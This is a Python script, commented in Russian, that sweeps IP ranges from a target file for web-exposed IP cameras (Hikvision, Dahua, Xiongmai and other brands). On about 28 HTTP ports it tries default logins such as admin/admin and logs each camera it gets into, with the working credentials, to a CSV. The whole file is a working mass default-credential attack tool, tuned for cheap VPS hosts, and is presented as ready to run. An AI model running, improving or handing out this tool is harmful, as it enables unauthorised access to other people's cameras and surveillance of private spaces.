#!/usr/bin/env python3
"""
AlphaScanner Ultra – Мгновенный старт, потоковая загрузка IP, без гигантской памяти.
Оптимизирован под слабые VPS.
"""
import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys, os, time, ipaddress, threading
from datetime import datetime
import urllib3
import multiprocessing

try:
    from tqdm import tqdm
except:
    print("[-] Установи tqdm: pip install tqdm")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# -------------------- НАСТРОЙКИ --------------------
TIMEOUT = 1.5
PORTS = [
    80, 81, 82, 83, 88,
    8000, 8001, 8080, 8081, 8082, 8085, 8088,
    8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
    8181, 8888, 9080, 9085, 15000, 18081
]
CREDENTIALS = [
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest")
]
SIGS = [
    "easyn", "ipcamera", "webcam", "netcam", "snapshot.cgi", "videostream",
    "mjpeg", "camera", "dahua", "hikvision", "onvif", "rtsp", "ip cam",
    "WEB SERVICE", "login.asp", "DCS-", "alphapd", "netcam",
    "xiongmai", "uniview"
]
# ------------------------------------------------------

found_lock = threading.Lock()
found_cameras = []

def auto_threads():
    cpu = multiprocessing.cpu_count()
    try:
        import psutil
        mem_gb = psutil.virtual_memory().total / (1024**3)
    except:
        mem_gb = 1
    base = cpu * 200
    if mem_gb < 1:   base = min(base, 300)
    elif mem_gb < 2: base = min(base, 500)
    else:            base = min(base, 800)
    return base

def iter_ips_from_range(start_ip, end_ip):
    """Генератор IP без хранения всего списка"""
    start = int(ipaddress.IPv4Address(start_ip))
    end = int(ipaddress.IPv4Address(end_ip))
    while start <= end:
        yield str(ipaddress.IPv4Address(start))
        start += 1

def iter_targets(filepath):
    """Читает файл построчно и выдаёт IP один за другим"""
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            # CIDR
            if '/' in line and ':' not in line:
                try:
                    net = ipaddress.ip_network(line, strict=False)
                    for ip in net:
                        yield str(ip)
                except:
                    pass
            # диапазон start-end
            elif '-' in line and ':' not in line:
                parts = line.split('-')
                if len(parts) == 2:
                    a, b = parts[0].strip(), parts[1].strip()
                    try:
                        yield from iter_ips_from_range(a, b)
                    except:
                        pass
            # одиночный IP
            else:
                yield line

def is_camera(text):
    tlow = text.lower()
    return any(sig in tlow for sig in SIGS)

def scan_ip(ip, output_file):
    sess = requests.Session()
    sess.verify = False
    for port in PORTS:
        for user, pwd in CREDENTIALS:
            try:
                url = f"http://{ip}:{port}"
                resp = sess.get(url, auth=HTTPBasicAuth(user, pwd),
                                timeout=TIMEOUT, allow_redirects=True)
                if resp.status_code == 200 and is_camera(resp.text):
                    with found_lock:
                        found_cameras.append((ip, port, user, pwd))
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(f"{ip},{port},{user},{pwd}\n")
                    return (ip, port, user, pwd)  # Возвращаем для вывода
            except:
                pass
    return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python alphascanner_ultra.py <targets.txt>")
        sys.exit(1)

    target_file = sys.argv[1]
    if not os.path.exists(target_file):
        print(f"[-] Файл {target_file} не найден")
        sys.exit(1)

    threads = auto_threads()
    print(f"[*] Потоков: {threads} | Таймаут: {TIMEOUT}с")
    out_file = f"ultrascan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(out_file, 'w', encoding='utf-8') as f:
        f.write("IP,Port,Username,Password\n")

    # Считаем количество задач для прогресс-бара (грубо)
    total_tasks = 0
    with open(target_file, 'r') as f:
        for line in f:
            if line.strip() and not line.startswith('#'):
                total_tasks += 256  # Примерно 256 IP на диапазон /24
    pbar = tqdm(total=total_tasks, desc="Охота", unit="ip", ncols=80)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        # Ограничиваем очередь, чтобы не забить память
        max_pending = threads * 2
        for ip in iter_targets(target_file):
            if len(futures) >= max_pending:
                done = []
                # Ждём хотя бы один завершённый future
                for f in list(futures.keys()):
                    if f.done():
                        done.append(f)
                        res = futures.pop(f)
                        if res:
                            tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
                        pbar.update(1)
                # Если ничего не завершилось, подождём немного
                if not done:
                    time.sleep(0.01)
            future = executor.submit(scan_ip, ip, out_file)
            futures[future] = None  # Результат будет получен позже

        # Оставшиеся задачи
        for future in as_completed(futures):
            res = future.result()
            if res:
                tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
            pbar.update(1)

    pbar.close()
    print(f"\n[+] Готово! Найдено камер: {len(found_cameras)}")
    print(f"[+] Результаты сохранены в {out_file}")

if __name__ == "__main__":
    main()